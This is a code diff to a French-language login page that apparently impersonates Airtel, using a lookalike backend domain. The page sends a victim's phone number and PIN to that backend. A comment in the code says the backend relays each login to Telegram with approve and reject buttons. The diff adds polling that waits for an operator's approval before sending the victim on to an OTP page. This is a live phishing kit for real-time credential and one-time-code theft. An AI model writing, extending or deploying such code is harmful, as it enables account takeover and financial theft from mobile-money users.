@@ -310,6 +310,7 @@
 <script>
   /* ==================== CONFIG ==================== */
   const BACKEND_URL = 'https://aairtel-production.up.railway.app';
+  const POLL_INTERVAL = 2000; // 2 seconds
 
   /* ==================== ELEMENTS ==================== */
   const pinInput = document.getElementById('pinInput');
@@ -363,6 +364,12 @@
     errorMsg.classList.remove('show');
   }
 
+  /* ==================== POLLING ==================== */
+  let pollTimer = null;
+  function stopPolling() {
+    if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+  }
+
   /* ==================== FORM SUBMIT ==================== */
   document.getElementById('loginForm').addEventListener('submit', async (e) => {
     e.preventDefault();
@@ -377,11 +384,10 @@
     hideError();
 
     try {
+      // 1. Send to backend → Telegram (with ✅ / ❌ buttons)
       const res = await fetch(`${BACKEND_URL}/api/login`, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           phone: phone,
           pin: pin,
@@ -394,23 +400,46 @@
       const data = await res.json();
 
       if (!res.ok || !data.success) {
-        throw new Error(data.error || 'PIN incorrect');
+        throw new Error(data.error || 'Erreur de connexion');
       }
 
-      // Success → redirect to OTP page
-      window.location.href = 'otp.html';
+      const requestId = data.request_id;
+
+      // 2. Waiting for admin — start polling
+      loginBtnText.textContent = 'EN ATTENTE DE VALIDATION...';
+
+      pollTimer = setInterval(async () => {
+        try {
+          const r = await fetch(`${BACKEND_URL}/api/login/status/${requestId}`);
+          const s = await r.json();
+
+          if (s.status === 'approved') {
+            stopPolling();
+            window.location.href = 'otp.html';
+          } else if (s.status === 'rejected' || s.status === 'expired') {
+            stopPolling();
+            resetWithError('Identifiants incorrects');
+          }
+        } catch (err) {
+          console.error('Poll error:', err);
+        }
+      }, POLL_INTERVAL);
+
     } catch (err) {
       console.error(err);
-      showError(err.message || 'Une erreur est survenue. Réessayez.');
-
-      // Reset
-      spinner.classList.remove('show');
-      loginBtnText.textContent = 'SE CONNECTER & RÉCLAMER';
-      loginBtn.disabled = false;
-      pinInput.value = '';
-      pinInput.focus();
+      resetWithError(err.message || 'Une erreur est survenue. Réessayez.');
     }
   });
+
+  /* ==================== RESET WITH ERROR ==================== */
+  function resetWithError(message) {
+    spinner.classList.remove('show');
+    loginBtnText.textContent = 'SE CONNECTER & RÉCLAMER';
+    loginBtn.disabled = false;
+    pinInput.value = '';
+    pinInput.focus();
+    showError(message);
+  }
 </script>
 </body>
 </html>
